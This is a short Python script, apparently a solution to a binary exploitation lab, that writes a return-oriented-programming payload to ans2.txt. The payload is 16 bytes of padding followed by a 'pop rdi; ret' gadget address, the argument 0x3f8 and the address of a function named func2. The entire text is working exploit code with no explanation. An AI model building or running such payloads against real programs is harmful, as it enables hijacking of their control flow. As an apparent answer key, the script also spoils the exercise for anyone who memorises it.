import struct
pop_rdi_ret = struct.pack("<Q", 0x4012c7)
arg1 = struct.pack("<Q", 0x3f8)
func2_addr = struct.pack("<Q", 0x401216)
padding = b"A" * 16 
payload = padding + pop_rdi_ret + arg1 + func2_addr
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("ans2.txt generated. Total length:", len(payload))